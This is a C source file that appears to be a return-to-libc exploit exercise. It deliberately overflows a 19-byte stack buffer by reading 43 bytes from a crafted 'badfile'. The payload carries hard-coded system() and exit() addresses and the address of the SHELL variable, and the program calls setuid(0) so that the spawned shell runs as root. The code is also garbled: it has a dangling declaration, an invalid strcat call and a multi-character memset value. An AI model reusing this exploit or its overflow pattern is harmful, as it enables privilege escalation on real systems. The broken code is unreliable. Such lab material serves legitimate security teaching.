#include <stdlib.h>
#include <stdio.h>
#include <string.h>


int func(FILE *badfile)
{
    char buffer[19];

    fread(buffer, sizeof(char), 43, badfile);

    return 1;
}

int main(int argc, char **argv)
{	
	int size = 43;
  char buf[size];
  FILE *badfile;
  memset(buf,'AS',size);
  badfile = fopen("./badfile", "w");
	    char *shell  = getenv("SHELL"); // shell
    if(shell){
	printf("%x\n", (unsigned int)shell);
	}
    char du
 
  *(long *) &buf[31] = 0xf7e0b370 ;   //  system() address
  *(long *) &buf[35] = 0xf7dfded0 ;   //  exit() address
  *(long *) &buf[39] = strcat('0x',shell);   //  "/bin/sh" //dynamic 
   
  fwrite(buf, 1, size, badfile);
  fclose(badfile);
    setuid(0);


    badfile = fopen("badfile", "r");
    func(badfile);
	
    printf("Successs\n");
    fclose(badfile);
    return 1;
}